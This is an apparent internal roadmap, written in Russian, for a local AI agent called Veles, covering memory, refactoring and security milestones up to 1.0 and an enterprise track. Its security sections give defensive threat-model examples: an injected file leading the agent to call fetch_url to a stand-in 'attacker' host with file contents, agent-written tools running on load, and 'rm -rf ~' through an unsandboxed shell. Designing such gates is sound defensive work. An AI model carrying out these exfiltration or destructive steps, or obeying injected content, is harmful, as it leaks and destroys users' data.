# Veles — план реализации Трека A (личный) до 1.0 + scope Трека B (корпоративный)

**Дата:** 2026-07-05 · Продолжение аудита `2026-07-05-product-security-architecture-audit.md`
**Нумерация:** git HEAD ≈ M190 → milestone'ы трека A получают сквозные **M191+**. Все якоря (`file:line`, сигнатуры) проверены чтением кода.

**Что это за документ.** Часть I — детальный implementation-план Трека A (личный локальный агент) до рыночного 1.0: каждый milestone с точными файлами/функциями, шагами, тест-стратегией, критерием готовности. Часть II — feature-scope Трека B (корпоративный) на уровне подсистем: что строить, почему, что затрагивает, зависимости, оценка, открытые вопросы.

**Область 1.0 (напоминание из аудита):** каналы (Telegram) и сетевой daemon — НЕ фичи персонального 1.0, а вход в Трек B. Поэтому в 1.0-гейт входят волны **P** (release-blockers) + **S-local** (локальный security, бьёт даже одного пользователя). Сетевой security (S-net) и enterprise-подсистемы — Трек B.

---

## Часть I. Трек A — implementation-план до 1.0

### Два тира внутри Трека A

Не всё в Треке A блокирует отгрузку ценности одному локальному пользователю. Разделяю честно (как security по поверхностям в аудите):

- **Тир 1 — настоящие release-gates 1.0** (пользователь видит / это его безопасность): **M191, M192, M193** (память работает и надёжна), **M196** (честные доки — launch-facing, нельзя рекламировать удалённый TUI), **M198–M201** (security соло-пользователя), **M202** (нарезка). Это и есть «1–2 спринта».
- **Тир 2 — pre-scale / fast-follow** (внутренняя зрелость, пользователь не видит; не блокирует ship, но нужно перед масштабированием и Треком B): **M194** (расцепить ядро), **M195** (декомпозиция repl.py, единственный L), **M197** (убрать Textual). Держим в плане, но вне критического пути 1.0.

### Порядок и зависимости

```
── ТИР 1 (критический путь 1.0) ─────────────────────────────
M191 (память в REPL)  ── highest ROI, без зависимостей, делать первым
   │
M192 (recall на эмбеддингах) ── зависит от recall-пути; после M191
M193 (память не тихнет)      ── та же область памяти; бандлится с M192
   │
M196 (честность docs/CLI)    ── дёшево, launch-facing, в любой момент
M198–M201 (S-local security) ── обязательны для 1.0, независимы от memory-работы
   │
M202 (release 1.0)           ── финальная нарезка
── ТИР 2 (fast-follow, вне критпути 1.0) ────────────────────
M194 (расцепить core↔cli/daemon) ── механический; разблокирует CI-инвариант; можно рано и параллельно
M195 (декомпозиция repl.py)      ── после M191 (сначала ценность, потом реорганизация)
M197 (судьба Textual)            ── после M195
```

Параллелизуемы без конфликтов: **M194**/**M196** — одновременно с M191/M192. **M198–M201** трогают `core/permission/*`, `core/tools/*`, `core/trust.py`, `core/*config*` — не пересекаются с memory/repl-работой.

### Про оркестрацию (differentiator №1 VISION) — сознательно вне 1.0-scope

Иерархическая мультиагентная оркестрация (VISION §2.1, §5.3) — заявленный differentiator №1 — **отгружена** (M122–M122f) и ни один аудитор не отметил её сломанной. В 1.0-гейт новой работы по ней не ставлю. **Единственное действие в Треке A:** добавить smoke-тест end-to-end (manager → worker → synth реально прогоняется через `delegate`/manager-spawn), чтобы флагманская фича не сгнила незамеченной между релизами. Это ~S, кладётся в M196 или отдельным под-пунктом. Явно фиксирую как *решение*, а не упущение.

---

### M191 — Оживить проектную память в дефолтном REPL ⭐ (наивысший ROI)

**Проблема.** `veles` без аргументов (флагманский UX) впрыскивает **ноль** recall и не запускает **ни одного** learning-loop-хука. Канонический `build_run_system_prompt(project, prompt="...")` вычисляет `<memory-context>` и `<relevant-files>` **только при непустом `prompt`** (`cli/_runtime.py:263-265` — `_recall_block` возвращает `None` на пустой query). REPL-фабрика зовёт `_build_run_system_prompt(args, project)`, а у REPL-args нет атрибута `prompt` → recall мёртв. И ни `_maybe_run_idle_curator`, ни `_maybe_run_insight_extractor/_post_turn_curator` в REPL не вызываются. Итог: «никогда не забывает» ложно в главном интерфейсе.

**Затрагиваемые файлы:**
- `cli/commands/repl.py` — фабрика агента (`factory`, ~строка 357-393); турн-луп `_ReplApp._run_chain` (2427-2469, финализация turn'а на 2461); близнец simple-REPL (финализация 1075); конец сессии в `cmd_repl` (~2534-2547, перед `store.close()` на 2547).
- `cli/_runtime.py` — `build_run_system_prompt` (230), `_recall_block` (263).
- `cli/_curator.py` — готовые хуки: `_maybe_run_idle_curator` (173), `_maybe_run_insight_extractor` (472), `_maybe_run_post_turn_curator` (204, внутри него `_maybe_run_post_turn_dream` на 275→`dream_cycle` на 290).

**Шаги:**
1. **Пробросить текст текущего turn'а в prompt-build (точная крайняя точка — проверено).** Фабрика `factory(state, *, mode_override, extra_system)` строит Agent **без** текста turn'а. Текст доступен как параметр `prompt` в mode-слое: каждый `Mode.run_turn(prompt, ctx)` делает `agent = ctx.factory(ctx.state)` затем `agent.run(prompt)` — то есть query в scope, но в фабрику не передаётся. **Фикс:** добавить kwarg `query` в фабрику (`repl.py:357`), пусть зовёт `build_run_system_prompt(project, prompt=query, ...)` напрямую (в обход `_build_run_system_prompt`-шима, читающего пустой `args.prompt`); и прокинуть `query=prompt` во всех call-site'ах: `core/modes/writing.py:46`, `planning.py:93`, `auto.py:86`, `goal.py:328,440,520` (и `worker_factory` на 550). `<memory-context>`/`<relevant-files>` уже пересобираются каждый turn (M186), так что смена query отражается сразу. *Затрагивает `core/modes/*` — чуть шире, чем только repl.py; `ctx.factory` — определённый шов, изменение чистое.*
2. **Навесить learning-loop-хуки на REPL-turn.** После финализации turn'а (`repl.py:2461`, и в simple-REPL на 1075) вызвать `_maybe_run_insight_extractor(args, project, result.history, result.session_id)` и `_maybe_run_post_turn_curator(args, project)` (последний тянет light-dream). Перед первым turn'ом сессии — `_maybe_run_idle_curator(args, project)`. Все функции идемпотентны/троттлятся сами (интервалы внутри), безопасно звать каждый turn.
3. **Снять комментарий-заглушку** `repl.py:217` («session id and insights are deliberately dropped here») — теперь не дропаем.
4. **Троттлинг для интерактивности.** Insight-extractor может звать LLM — не блокировать ввод. Пускать хуки в том же executor-thread, что и turn (`_blocking_turn`, 2471), после ответа, чтобы UI не фризился; либо в фоне с флагом занятости.

**Тесты:**
- Unit: фабрика с непустым query → промпт содержит `<memory-context>` (мокнутый store с одним инсайтом по ключевому слову).
- Integration: два REPL-turn'а, где turn 2 перефразирует factum из turn 1 → recall инжектит запись из turn 1 (при keyword-overlap; полный семантический — M192).
- Integration: после N turn'ов post-turn-curator вызван (spy на `_maybe_run_post_turn_curator`), инсайт извлечён в `memory.db`.
- Регресс: simple-REPL (`VELES_REPL_SIMPLE=1`) получает те же хуки.

**Риск:** низкий (аддитивно, переиспользует протестированные `_maybe_run_*`). Главное — не зафризить ввод (шаг 4).
**Готово, когда:** в REPL-сессии recall-блок виден в промпте (проверяемо через `/context`), и после turn'ов инсайты появляются в `memory.db` без отдельного `veles run`.

---

### M192 — Recall на эмбеддингах (семантический, не только keyword-FTS)

**Проблема.** `MemoryRouter.recall(query, *, limit=5)` (`core/memory/router.py:73`) собирает только FTS5-стримы (wiki/insights/turns, склейка на `router.py:80`). Перефразированный запрос без общих токенов промахивается навсегда. **Важная поправка к аудиту:** нельзя «просто подключить `vector.py`» — таблицу `embeddings_blob` сейчас **никто не пишет** (единственный писатель `migrate_legacy_skill_embeddings` — test-only). Значит нужен и write-путь, и read-стрим.

**Затрагиваемые файлы:**
- `core/memory/vector.py` — `knn(conn, query_vec, *, ref_kind=None, limit=10)` (204), `upsert_embedding(conn, *, ref_kind, ref_id, vec, now=None)` (143), `ensure_embeddings_table(conn)` (108), `available_backend()` (73), `EmbeddingHit` (57).
- `modules/embedding.py` — `get_embedding_adapter() -> EmbeddingAdapter | None` (66), `adapter.embed(texts) -> list[list[float]]` (42). Единственный адаптер query→vector.
- `core/memory/router.py` — добавить `_collect_vector` рядом с `_collect_insights` (152)/`_collect_turns` (166), вписать в `streams` на 80.
- `core/memory/__init__.py` — точки создания инсайтов/turn'ов (writers), где вешать `upsert_embedding`.

**Шаги:**
1. **Write-путь.** При записи инсайта и turn'а вычислять вектор через `get_embedding_adapter().embed([text])` и класть `upsert_embedding(conn, ref_kind="insight"/"turn", ref_id=..., vec=...)`. Best-effort: нет адаптера → пропустить (FTS остаётся), не падать.
2. **Backfill-миграция** существующих инсайтов/turn'ов (форвард-онли, идемпотентно, как схемные миграции на `memory/__init__.py:319-358`): пройтись по строкам без вектора, доэмбедить пачками.
3. **Read-стрим.** `_collect_vector(query, limit)`: `qvec = get_embedding_adapter().embed([query])[0]`; `knn(conn, qvec, limit=...)`; смапить `EmbeddingHit → RecallHit`. Вписать в `streams` (`router.py:80`), пропустить через существующий `rerank(...)`.
4. **Локальность (критично для УТП и для Трека B).** Эмбеддинги обязаны идти через локальный backend, когда провайдер локальный. Починить `modules/embedding_autodetect.py:38-79`: fallback в облако — по `--provider`/config, **не** по факту наличия `OPENROUTER_API_KEY`. Иначе recall-текст + пути тихо уедут в облако (аудит, A-minor). Fail-loud, не silent-cloud.
5. **Унификация (опционально, но зафиксировать).** Сейчас три пути эмбеддингов: `memory.vector`, `core/skill_embedding.py` (skill-dedup), `project_tree.relevant_semantic` (свой `get_embedding_adapter()` + локальный `_cosine`). Свести на единый `get_embedding_adapter()` как источник вектора; `vector.knn` — как единственный KNN-бэкенд. Разнести на под-задачу, если раздувает milestone.

**Тесты:** knn находит перефразированный инсайт, которого FTS не видит (общих токенов ноль); backfill идемпотентен (повторный прогон не дублирует); при локальном провайдере и down-облаке recall не делает сетевых вызовов (spy на http); нет адаптера → FTS-only, без исключений.
**Риск:** средний (write-путь на горячем пути записи памяти — держать best-effort и вне критической секции). **Готово:** перефразированный запрос возвращает релевантную память; при `--provider ollama` recall на 100% локален.

---

### M193 — Память не тихнет (устойчивость recall)

**Проблема.** `search_turns`/`search_insights` возвращают `[]` на любой `sqlite3.OperationalError` (`memory/__init__.py:539-565`) — битый FTS = тихая амнезия без сигнала. Плюс сырые turn'ы жёстко выпадают из recall на 30 дней (`router.py:43,175-176`) в предположении, что curator их дистиллировал; если curation не запускался (до M191 — всегда в REPL; для claude-cli/gemini-cli — авто-curation недоступна) — память тихо неотзываема.

**Шаги:**
1. `OperationalError` в recall — логировать + однократно сигналить пользователю («индекс памяти повреждён, запустите `veles doctor`»), не глотать молча. Добавить починку в `veles doctor` (REINDEX FTS).
2. Флаг «distilled» на turn'е: сырой turn не выпадает из recall на 30 дней, **пока** его не поглотил curator. TTL применять к дистиллированным, к сырым-недистиллированным — нет (или больший TTL).
3. (Связка с M191) — раз REPL теперь дистиллирует, окно 30 дней перестаёт означать потерю.

**Тесты:** повреждённый FTS → сигнал, не пустой recall; недистиллированный turn возрастом 40 дней всё ещё отзываем. **Риск:** низкий. **Готово:** ни один путь потери памяти не молчит.

---

### M194 — Расцепить ядро от cli/daemon (инвариант «минимальное модульное ядро»)

**Проблема.** Два top-level протекания графа зависимостей: `core/model_resolver.py:35` тянет `DEFAULT_MODEL/DEFAULT_PROVIDER` из `cli/_parsers/_common.py:17,20`; `core/tool_dispatch.py:235,354` тянет `truncate_for_log` из `daemon/logging.py:84`. Ядро не импортируется без cli/daemon.

**Шаги:**
1. Перенести `DEFAULT_MODEL`/`DEFAULT_PROVIDER` в core (напр. `core/defaults.py` или к `core/routing/ensemble.py`, который уже владеет дефолт-роутом). `cli/_parsers/_common.py` — реэкспортит из core (не наоборот).
2. Перенести `truncate_for_log` (чистый строковый хелпер, без daemon-зависимостей) в `core/log_util.py`; `daemon/logging.py` реэкспортит.
3. **CI-инвариант** (как «нет Hermes» грепом): тест, что `veles.core.*` не импортирует `veles.cli` / `veles.daemon` / `veles.channels` на top-level. Ловит будущие регрессы.

**Тесты:** `import veles.core.model_resolver` в окружении без cli — успех; grep-инвариант красный на нарушении. **Риск:** низкий, механический. **Готово:** ядро импортируется автономно, инвариант в CI.

---

### M195 — Декомпозировать god-file `repl.py` (2548 строк)

**Проблема.** `cli/commands/repl.py` — 2548 LOC, класс `_ReplApp` ~1079-2495. Прямое нарушение опоры №1 «clean, decomposed, no god-files». Пакет `cli/repl/` уже частично извлечён (`clipboard`, `completer`, `file_index`, `history`, `model_catalog`, `model_fetcher`, `slash/`), но god-file остаётся основным путём.

**Швы для извлечения** (методы `_ReplApp` сгруппированы по ролям — точные диапазоны из карты):
- **Pickers** → `cli/repl/pickers/`: model-picker (1629-1732), file-picker (1783-1878), theme-picker (1889-1989). Крупнейший однородный блок.
- **Keybindings** → `cli/repl/keys.py`: `_make_keys` (2000, большой) + cancellation (`_on_ctrl_c` 2306, `_cancel_generation` 2338).
- **Status/HUD render** → `cli/repl/hud.py`: `_status_fragments`/`_meta_fragments`/`_picker_fragments`/`_push_meta`/`_tick_meta` (1373-1470).
- **Ask/permission** → `cli/repl/prompts.py`: `_ask`/`_confirm_critical`/`_permission_prompt`/`_picker_rows`/`_answer`/`_picker_enter` (1471-1589).
- **History-buffer** → расширить существующий `cli/repl/history.py`: `_record_history`/`_set_input`/`_history_up`/`_history_down` (2259-2305).
- **Turn-dispatch** (ядро, здесь живут хуки M191) → `cli/repl/turn.py`: `_dispatch`/`_slash`/`_run_chain`/`_blocking_turn` (2361-2495). Оставить тонким.

`_ReplApp` после этого — оркестратор-скелет, делегирующий в модули. Порог god-file (800 LOC) должен быть пробит.

**Порядок:** после M191 (сначала ценность памяти, потом реорганизация — turn.py заберёт хуки уже рабочими). Извлекать по одной группе, гоняя тесты между.
**Тесты:** существующие REPL-тесты зелёные после каждого извлечения (это refactor, поведение неизменно); опора на mock — повод добавить пару black-box тестов через публичную точку REPL. **Риск:** средний (много mock-тестов лезут во внутренние имена — переезд имён их сломает; правbefore/после). **Готово:** ни один файл REPL > 800 LOC, `_ReplApp` — скелет.

---

### M196 — Честность docs/CLI (дёшево, высокий trust-эффект перед публичным релизом)

**Шаги:**
1. Синхронизировать потолок: MILESTONES.md (M187) ↔ git (M190) ↔ CLAUDE.md (два конфликтующих потолка M164 и M187) → один источник.
2. Задокументировать 4 orphan-verb'а: `browse`, `organize`, `self-doc`, `layout` (в README + CLAUDE command-block).
3. README: «TUI» → «REPL» (Textual chat-TUI удалён в M187); переснять `tui-hero.gif`/`tui-tour.gif` (вероятно показывают удалённый Textual).
4. Env-фантомы: удалить `VELES_TUI_MOUSE` из VISION §7.2; убрать богус-строку `VELES_CACHE_BREAKPOINT` из env-доки; задокументировать реальный `VELES_REPL_SIMPLE`.
5. VISION §7.2 привести в соответствие с M187 (описывает Textual-TUI как «будущий основной интерфейс», а он построен-и-удалён).

**Риск:** тривиальный. **Готово:** доки описывают реально существующий продукт.

---

### M197 — Решить судьбу Textual (−3 501 LOC + тяжёлый dep, дешевле, чем казалось)

**Уточнение из кода:** оба wizard'а **уже деградируют** без Textual — isatty-guard → stdin-fallback: user-wizard (`cli/wizard.py:185` TUI / `:214` stdin `run_wizard`), project-wizard (`cli/project_wizard.py:326` TUI / `:346` stdin). Textual-hard только **daemon-picker** (`cli/commands/daemon.py:431`), у которого fallback = просто ошибка (`:417`).

**Рекомендация — убрать Textual:**
1. Построить не-Textual daemon-picker на `prompt_toolkit` (паттерн уже есть — pickers в REPL) или простой нумерованный stdin-список.
2. Удалить Textual-runner'ы wizard'ов (`tui/wizard/*`), оставив stdin-пути как единственные (они уже основные при non-tty).
3. Удалить `tui/` (22 файла, 3 501 LOC) и `textual>=0.85` из `pyproject.toml`; `uv lock`.

**Альтернатива** (если Textual-wizards ценны как UX): явно зафиксировать Textual как поддерживаемую wizard-поверхность, убрать «retired»-формулировки, оставить dep. Хуже по весу.
**Тесты:** daemon-picker работает без textual (grep-инвариант «нет `import textual`» после удаления); wizard'ы проходят на non-tty. **Риск:** средний (daemon-picker переписать). **Готово:** решение принято и реализовано; если убрали — dep нет, вес −3.5k LOC.

---

### M198 — Untrusted-args gate (S-local; закрывает HIGH-эксфильтрацию)

**Проблема.** `_untrusted_args_rule` (`core/permission/engine.py:141`) — документированный no-op («Today: no-op», `return None` на 151). Контент помечается untrusted (`core/untrusted.py`), но действовать на нём ничто не мешает. Бьёт даже соло-пользователя: `veles add` внешнего файла → чтение → `fetch_url("attacker?d=<contents>")`.

**Шаги:** реализовать правило: tool-call, чьи аргументы выведены из untrusted-источника (web/MCP/`add`/канал), для egress-тулов (`fetch_url`, `web_search`, любой сетевой/деструктивный) требует явного подтверждения **даже в autopilot** (не подпадает под тихий allow). Использовать существующую разметку `core/untrusted.py`. Прокинуть провенанс аргумента до `engine`.
**Тесты:** аргумент из untrusted-контента → confirm/deny, не тихий allow; чистый пользовательский аргумент → без трения. **Риск:** средний (провенанс данных через слои). **Готово:** правило не no-op; эксфильтрация-путь требует подтверждения.

---

### M199 — Ревью-гейт на самописные tools (S-local; закрывает HIGH-RCE-при-загрузке)

**Проблема.** `.veles/tools/*.py` импортируются через `importlib.exec_module` (`core/tools/loader.py:196-197`) — код верхнего уровня исполняется **на старте агента**, до permission-engine/trust. Tool без `risk_class` → `effective_policy` = `allow` (`core/permission/policy.py:135-137`).

**Шаги:**
1. Хэш-allowlist одобренных tools: перед `exec_module` сверять SHA новых/изменённых `.veles/tools/*.py` с журналом одобренных; новый/изменённый → запрос одобрения (trust ladder), не исполнять до одобрения.
2. Tool без `risk_class` → дефолт `deny`/confirm, не `allow` (`policy.py:135`).
3. (Связка с M198) — раз tool может быть написан агентом под инъекцией, гейт закрывает и путь H2→H3.
**Тесты:** новый `.veles/tools/x.py` не исполняется без одобрения; изменённый хэш → повторное одобрение; tool без risk_class не диспатчится тихо. **Риск:** средний. **Готово:** самописный код не исполняется до явного одобрения.

---

### M200 — Autopilot не всесилен (S-local)

**Проблема.** Autopilot авто-разрешает все sensitive-tools (`core/trust.py:117-122`); standing «always»-гранты диспатчатся молча навсегда (`:103-111`).
**Шаги:** даже в autopilot/always оставить always-confirm (или tamper-evident журнал с ревью-циклом) для: сетевого egress на новый хост, записи самописного tool, удаления вне проекта. Опереться на существующий `core/critical_ops.py` (у которого уже нет env-байпаса) — расширить перечень.
**Тесты:** в autopilot-окне egress на новый хост всё ещё спрашивает/журналируется. **Риск:** низкий. **Готово:** autopilot не даёт тихий путь к эксфильтрации/RCE.

---

### M201 — Config-валидация (S-local + rot)

**Проблема.** `core/project_config.py:44-48` никогда не бросает; опечатка `whitlist =` тихо игнорируется — для канала это «открыт всем». Конфиг бессхемный (`get_section()` free-form), опечатки падают молча.
**Шаги:** схема config.toml (pydantic или явный валидатор) с fail-loud на неизвестных/опечатанных ключах в security-значимых секциях (`[channels.*]`, `[daemon.*]`, `[mcp.*]`, `[trust]`). `veles doctor` — прогон валидации.
**Тесты:** опечатанный ключ whitelist → явная ошибка, не тихий пропуск. **Риск:** низкий. **Готово:** security-значимый конфиг не молчит на опечатках.

---

### M202 — Нарезка 1.0

CI-parity (ruff check+format, mypy, `uv sync --locked`, pytest на ubuntu+macos), `uv lock` после bump версии, `chore(release): 1.0.0`, обновить MILESTONES.md, тег/PR в `main` по конвенции проекта. Проверить, что README Quick Start честен для не-автора (onboarding ~15 мин уже хорош).

**Итог 1.0-гейта:** P (M191-M197) + S-local (M198-M201) + release (M202) = **лучший локально-первый персональный агент, который реально не забывает и не утекает у одного пользователя.**

---

## Часть II. Трек B — scope дальнейшей разработки (корпоративный)

> Уровень — feature-scope, не line-level. Это roadmap v2 **поверх стабильного A**. Ключ: A построен single-tenant (VISION §10 — не-цели: нет аккаунтов/cloud/команд); B — смена класса системы на multi-tenant сервис. Каждая фича ниже — это подсистема, а не milestone; при постановке дробится на M###.

### Порядок Трека B (по зависимостям)

```
B0 (лицензионная модель) ── решить ДО первой enterprise-строки
B1 (self-driving loop) + B2 (crash/retry) ── фундамент автономии, независимы
B3 (identity+audit) ── несущий; блокирует всё multi-user
B4 (data-lifecycle/compliance) ── зависит от B3 (удаление по субъекту)
B5 (deploy) + B6 (observability) ── операционная зрелость, после B1/B2
B7 (shell sandbox) + S-net ── гейт «прежде чем пускать недоверенных пользователей»
```

---

### B0 — Лицензионная / монетизационная модель (решить первым)

**Зачем.** Apache-2.0 + «монетизация через платную enterprise-интеграцию и поддержку» — классическая open-core экспозиция: ничто не мешает третьей стороне перепродать ту же интеграцию. Главный канал выручки юридически не защищён.
**Scope:** выбрать модель — open-core (ядро Apache-2.0, enterprise-слой B1-B7 под проприетарной/BSL-лицензией) / dual-license / BSL с конверсией в Apache через N лет. Определить границу «что бесплатно / что платно» (обычно: identity+audit+deploy+observability+SSO — платные). Оформить CLA для внешних контрибьюторов, если enterprise-слой закрытый.
**Открытый вопрос:** где ровно граница ядро/enterprise — она же определяет, какие B-фичи идут в закрытый слой.

---

### B1 — Self-driving execution loop («работает до результата»)

**Зачем.** Сейчас «работает до результата» физически отсутствует: GoalMode FSM turn-gated («один prompt = один переход фазы», `core/modes/goal.py:12`); после EXECUTE ждёт, пока человек напечатает `continue` (:32-35, :599). Scheduled job = один `agent.run()` с потолком 30 итераций (`core/agent.py:145`), без моста job→goal.
**Scope:** автономный цикл EXECUTE→CHECK→EXECUTE до достижения результата/исчерпания бюджета без человека; мост job→goal (scheduled job запускает goal-loop, не одиночный run); рабочие бюджеты — починить `add_cost` (сейчас не кормится реальной ценой, `modes/goal.py:529-535`, поэтому $-бюджет не срабатывает никогда); stall-guard; re-queue при достижении потолка итераций.
**Затрагивает:** `core/modes/goal.py`, `core/goal.py`, `core/agent.py`, `core/jobs/*`, daemon runner.
**Оценка:** L (несущая новая механика автономии). **Зависимости:** независим от B2, но реально полезен только с B2 (иначе долгий loop не переживает сбой).
**Открытый вопрос:** критерий «результат достигнут» — LLM-самооценка (риск зацикливания) vs явные acceptance-checks в задаче.

---

### B2 — Устойчивость к падениям и ретраи

**Зачем.** `DaemonState.runs` — in-memory dict (`daemon/state.py:61`); смерть daemon = run исчезает, rehydrate на старте отсутствует. Упавший job оставляет `status='running'` навсегда (`jobs_store.py:267-274`) и перезапускается (случайный at-least-once). Ретраев провайдера нет (0 `retry|backoff` в адаптерах; локальные `max_retries=0`); `FailoverProvider` есть, но **мёртвый код** (никто не импортирует). Для часового run'а транзиентный 503 фатален.
**Scope:** персистентность run-состояния + rehydrate на старте daemon; очистка/восстановление orphan `status='running'`; оживить `FailoverProvider` + экспоненциальный backoff в адаптерах провайдеров; watchdog/health-supervision процесса; идемпотентность job'ов (exactly-once или явный at-least-once с дедупом).
**Затрагивает:** `daemon/state.py`, `daemon/runner.py`, `daemon/server.py`, `core/provider_pool.py`, `adapters/*`, `core/jobs/jobs_store.py`.
**Оценка:** L. **Зависимости:** фундамент для B1 (24/7). **Открытый вопрос:** где хранить run-состояние (в memory.db проекта vs отдельный daemon-store).

---

### B3 — Идентичность, права и аудит на человека (несущий для multi-user)

**Зачем.** Мультипользовательность архитектурно отсутствует. Auth — общие bearer-токены, чей принципал **выбрасывается** middleware (`daemon/auth.py:129-149`); run API без actor-поля; Telegram `user_id` намеренно исключён из session-key (`channels/session_map.py:56-59`) → пользователи группы делят одну сессию и одну память; trust — per-tool/per-OS-аккаунт, не per-человек. Аудит пишет ЧТО (`events.jsonl`, `core/events.py:66-84`), но КТО — только `session_id`; `ApprovalRecord.approver` всегда `"user"`/`"autopilot"`. Для компании «какой человек вызвал этот `rm`?» — без ответа; оба стока best-effort, не tamper-evident.
**Scope:** модель принципала (пользователь/сервис-аккаунт), крепится из bearer-токена/канала к каждому run/log; `user_id` в session-key (изоляция сессий и памяти на пользователя); actor-поле в run API; trust и права per-человек (роли); `ApprovalRecord.approver` = реальный субъект; tamper-evident аудит-лог (append-only, подписанный/хэш-цепочка). Опционально: SSO/OIDC для enterprise.
**Затрагивает:** `daemon/auth.py`, `daemon/server.py`, `channels/session_map.py`, `core/trust.py`, `core/events.py`, `core/approval.py`. **Меняет VISION §8/§10.**
**Оценка:** XL (пронизывает auth, run API, session-keying, trust-store, оба аудит-стока). **Зависимости:** блокирует B4 и любой безопасный multi-user. **Открытый вопрос:** глубина — просто «кто» в аудите vs полноценные роли/RBAC/tenancy.

---

### B4 — Data-lifecycle / compliance (GDPR-блокер, не «гниль»)

**Зачем.** «Никогда не забывает» + **полное отсутствие пути удаления** = невозможность выполнить право на удаление (GDPR right-to-erasure) и retention-политику. Сейчас: нет eviction/prune/VACUUM нигде; dedup смотрит только 200 свежих инсайтов (`dreaming.py:72`) — старая масса не пересматривается; supersede-not-delete (хорошо для истории, плохо для «сотрите мои данные»).
**Scope:** команда стирания по субъекту/проекту (жёсткое удаление + VACUUM, не supersede); retention-TTL с реальным prune; eviction памяти при росте; экспорт данных субъекта (data-portability). Для enterprise — audit того, что удаление действительно произошло.
**Затрагивает:** `core/memory/*`, `core/dreaming.py`, `core/export.py`. **Зависимости:** удаление «по субъекту» требует B3 (идентичность). **Оценка:** M. **Открытый вопрос:** совместимость «tamper-evident аудит» (B3, неизменяемый) с «жёсткое удаление» (B4) — что удаляется, что остаётся в аудите как факт удаления.

---

### B5 — Deploy story

**Зачем.** Ноль артефактов деплоя (нет `Dockerfile`/compose/systemd/Helm); только PyPI+CI. Headless-first-run — ловушка (non-TTY trust отказывает по умолчанию, `trust.py:277`; keychain-fallback недокументирован). Компании самохостить нечем.
**Scope:** Dockerfile + docker-compose (daemon + том памяти); systemd unit; headless-first-run без TTY-ловушки (env/config-based provisioning секретов и trust-дефолтов); документированный migration-path для схемы memory.db при апгрейдах; опц. Helm-chart.
**Затрагивает:** новые deploy-артефакты; `core/secrets.py`, `core/trust.py` (headless-режим), first-run-путь. **Оценка:** M. **Зависимости:** ценен после B1/B2 (иначе деплоить нечего устойчивого).

---

### B6 — Observability

**Зачем.** Ноль метрик (`prometheus|otel|sentry` не найдены); логи — plain-text rotating; health-endpoint есть, но алертинга/агрегации нет; ошибки умирают в логе.
**Scope:** метрики (Prometheus/OpenTelemetry — run-ы, токены, латентность провайдера, ошибки, очередь job'ов); structured logs (JSON); алертинг на сбои run/провайдера; дашборд-ready экспорт. TLS as default для не-loopback (см. S-net).
**Затрагивает:** `daemon/*`, `core/events.py`, адаптеры. **Оценка:** M. **Зависимости:** после B1/B2 (мониторить есть что).

---

### B7 — Реальный sandbox для shell (+ волна S-net)

**Зачем.** `run_shell` — `bash -c` с полными правами, явно **не** в песочнице (`core/tools/builtin/run_shell.py:16-23`; `sandbox_cwd()` пинит только cwd). `rm -rf ~` вне проекта возможен, как только run_shell доверен — а любой daemon/канальный деплой этого требует. Неприемлемо для агента, смотрящего на недоверенных пользователей.
**Scope:** реальная изоляция — seccomp/namespaces (Linux), контейнер-per-run, или как минимум denylist + FS-jail; ресурсные лимиты (CPU/RAM/время/сеть). **Волна S-net** (гейт «перед включением каналов/daemon»): S1 Telegram fail-closed (`_gateway.py:687`), S4 `wrap_untrusted` на MCP-результаты/текст каналов (`mcp/registry_adapter.py:56-86`), S6 TLS + гигиена секретов (токен daemon не в лог, `export full` не архивирует секреты verbatim).
**Затрагивает:** `core/tools/builtin/run_shell.py`, `core/path_guard.py`, `channels/*`, `daemon/*`, `mcp/*`, `core/export.py`. **Оценка:** L (sandbox — нетривиально кросс-платформенно). **Зависимости:** обязателен перед любым публичным/недоверенным доступом. **Открытый вопрос:** уровень изоляции vs кросс-платформенность (seccomp — Linux-only; macOS-dev нужен иной путь).

---

## Сводка оценок

| Трек | Milestone | Тип | Оценка | Тир |
|------|-----------|-----|--------|:---:|
| A | M191 память в REPL | feature | S-M | 1 — gate |
| A | M192 recall на эмбеддингах | feature | M | 1 — gate |
| A | M193 память не тихнет | reliability | S | 1 — gate |
| A | M196 честность docs (+ orchestration smoke-test) | docs | S | 1 — gate |
| A | M198 untrusted-args gate | security | M | 1 — gate |
| A | M199 tools review-gate | security | M | 1 — gate |
| A | M200 autopilot не всесилен | security | S | 1 — gate |
| A | M201 config-валидация | security | S | 1 — gate |
| A | M202 release 1.0 | release | S | 1 — gate |
| A | M194 расцепить ядро | refactor | S | 2 — fast-follow |
| A | M195 декомпозиция repl.py | refactor | L | 2 — fast-follow |
| A | M197 судьба Textual | refactor | M | 2 — fast-follow |
| B | B0 лицензия | strategy | — | — |
| B | B1 self-driving loop | feature | L | — |
| B | B2 crash/retry | reliability | L | — |
| B | B3 identity+audit | feature | XL | — |
| B | B4 data-lifecycle | compliance | M | — |
| B | B5 deploy | ops | M | — |
| B | B6 observability | ops | M | — |
| B | B7 shell sandbox + S-net | security | L | — |

**Критический путь до 1.0 (только Тир 1):** M191 → M192/M193 → M198/M199 → M202; M196/M200/M201 параллельны. Тир 2 (M194/M195/M197) — fast-follow, вне критпути.
**Критический путь Трека B:** B0 → B3 → (B1+B2) → B4 → B5/B6 → B7.
